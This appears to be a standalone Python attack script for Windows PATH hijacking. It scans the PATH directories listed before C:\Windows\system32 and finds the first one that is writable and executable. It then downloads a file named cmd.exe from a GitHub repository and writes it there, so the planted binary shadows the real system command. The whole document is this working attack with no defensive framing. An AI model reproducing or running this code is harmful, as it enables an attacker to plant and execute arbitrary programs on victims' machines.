import os
import requests
a=(os.environ['Path'])
b=a.split(';')
for i in b:
    if(i=="C:\\Windows\\system32"):
        break
    else:   
        access=os.access(i, os.X_OK | os.W_OK) 
        if(access==True):
            u = "https://github.com/deepakkeshav98/malrev/blob/main/cmd.exe?raw=true"
            r = requests.get(u)
            open(i+'\\cmd.exe', 'wb').write(r.content)
            break

